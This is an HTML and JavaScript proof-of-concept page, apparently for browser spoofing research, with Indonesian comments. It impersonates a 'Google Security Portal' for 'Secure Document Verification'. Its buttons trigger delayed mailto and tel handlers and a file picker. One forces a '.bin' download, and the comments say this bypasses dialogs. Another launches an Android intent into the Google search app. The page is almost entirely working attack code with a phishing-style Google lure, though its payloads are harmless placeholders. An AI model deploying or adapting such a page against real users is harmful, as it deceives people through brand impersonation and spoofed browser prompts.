<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Picker, Protocol & Intent Spoof PoC - Hardened</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            width: 100%;
            max-width: 340px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 28px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
            cursor: pointer;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .preview-container {
            margin-top: 25px;
            max-width: 280px;
            display: none;
        }
        .preview-container img {
            width: 100%;
            border-radius: 8px;
            border: 1px solid #dadce0;
            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
        }
        .file-info {
            margin-top: 10px;
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>Secure Document Verification</h1>

    <!-- Container dengan tombol lengkap termasuk Android Intent Spoof -->
    <div class="button-container">
        <a href="#" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
        <a href="#" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
        <a href="#" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
        <a href="#" class="spoof-link" id="targetLinkDownload" data-intent="download_bypass">Open Window & Bypass Download</a>
        <a href="#" class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
    </div>

    <!-- Uploaded Image Preview Box -->
    <div class="preview-container" id="previewBox">
        <img id="imagePreview" src="" alt="File Preview">
        <div class="file-info" id="fileInfo"></div>
    </div>

    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        let triggered = false;

        // Vektor khusus Download Bypass yang dieksekusi langsung untuk mempertahankan Transient User Activation
        const executeDownloadBypass = (intent) => {
            const previewBox = document.getElementById("previewBox");
            const imagePreview = document.getElementById("imagePreview");
            const fileInfo = document.getElementById("fileInfo");

            try {
                // Membuat payload binary untuk memaksa unduhan langsung tanpa intervensi dialog ekstensi/sandbox
                const payloadContent = "Google Security Verification Payload - Intent Bypass Token: " + intent + "\nTimestamp: " + Date.now();
                const blob = new Blob([payloadContent], { type: 'application/octet-stream' });
                const blobUrl = URL.createObjectURL(blob);
                
                // Membuat elemen anchor secara dinamis di dalam DOM saat interaksi pengguna aktif
                const tempAnchor = document.createElement('a');
                tempAnchor.href = blobUrl;
                tempAnchor.download = "security_verification_token.bin";
                tempAnchor.style.display = "none";
                
                document.body.appendChild(tempAnchor);
                tempAnchor.click(); // Trigger langsung download
                
                // Cleanup setelah trigger
                setTimeout(() => {
                    document.body.removeChild(tempAnchor);
                    URL.revokeObjectURL(blobUrl);
                }, 500);

                fileInfo.innerText = `Successfully triggered forced download bypass vector for intent: [${intent}]`;
                imagePreview.src = "";
                previewBox.style.display = "block";
            } catch (err) {
                fileInfo.innerText = `Download blocked/failed: ${err.message}`;
                previewBox.style.display = "block";
            }
        };

        const executeAttackVector = (actionType, intent) => {
            if (actionType === 'downloadbypass') {
                executeDownloadBypass(intent);
                return;
            }

            if (triggered) return;
            triggered = true;

            setTimeout(async () => {
                try {
                    const previewBox = document.getElementById("previewBox");
                    const imagePreview = document.getElementById("imagePreview");
                    const fileInfo = document.getElementById("fileInfo");

                    if (actionType === 'mailto') {
                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
                        const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
                        fileInfo.innerText = `Triggered mailto protocol with intent: [${intent}]`;
                        imagePreview.src = "";
                        previewBox.style.display = "block";
                    } 
                    else if (actionType === 'tel') {
                        window.location.href = "tel:+18005550199";
                        fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
                        imagePreview.src = "";
                        previewBox.style.display = "block";
                    } 
                    else if (actionType === 'filepicker') {
                        const [fileHandle] = await window.showOpenFilePicker({
                            multiple: false,
                            types: [{
                                description: 'Images & Documents',
                                accept: { 
                                    'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
                                    'application/pdf': ['.pdf']
                                }
                            }]
                        });

                        const file = await fileHandle.getFile();
                        fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;

                        if (file.type.startsWith('image/')) {
                            imagePreview.src = URL.createObjectURL(file);
                            previewBox.style.display = "block";
                        } else {
                            imagePreview.src = "";
                            previewBox.style.display = "block";
                        }
                    }
                    else if (actionType === 'intentspoof') {
                        const intentUrl = "intent://www.google.com/gasearch?q=https://google.com#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
                        window.location.href = intentUrl;
                        fileInfo.innerText = `Triggered Android intent spoof vector for intent: [${intent}]`;
                        imagePreview.src = "";
                        previewBox.style.display = "block";
                    }

                } catch (err) {
                    console.debug("Handler cancelled or blocked:", err.message);
                } finally {
                    setTimeout(() => { triggered = false; }, 1000);
                }
            }, 2400);
        };

        // Event listeners untuk tombol-tombol
        const linkMailto = document.getElementById("targetLinkMailto");
        linkMailto.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('mailto', linkMailto.getAttribute('data-intent')); });

        const linkTel = document.getElementById("targetLinkTel");
        linkTel.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('tel', linkTel.getAttribute('data-intent')); });

        const linkFile = document.getElementById("targetLinkFile");
        linkFile.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('filepicker', linkFile.getAttribute('data-intent')); });

        // Handler khusus Download Bypass menggunakan event click langsung untuk mengamankan aktivasi browser
        const linkDownload = document.getElementById("targetLinkDownload");
        linkDownload.addEventListener("click", (e) => {
            e.preventDefault();
            executeAttackVector('downloadbypass', linkDownload.getAttribute('data-intent'));
        });

        const linkIntent = document.getElementById("targetLinkIntent");
        linkIntent.addEventListener("click", (e) => { e.preventDefault(); executeAttackVector('intentspoof', linkIntent.getAttribute('data-intent')); });
    </script>

</body>
</html>
